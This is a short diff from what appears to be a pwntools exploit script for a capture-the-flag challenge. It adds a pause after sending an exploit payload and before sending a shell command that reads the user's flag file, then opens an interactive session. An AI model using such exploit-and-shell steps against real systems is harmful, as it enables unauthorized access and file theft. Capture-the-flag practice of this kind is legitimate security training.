@@ -34,6 +34,8 @@ p = flat(
 
 y.send( p )
 
+sleep(1)
+
 y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
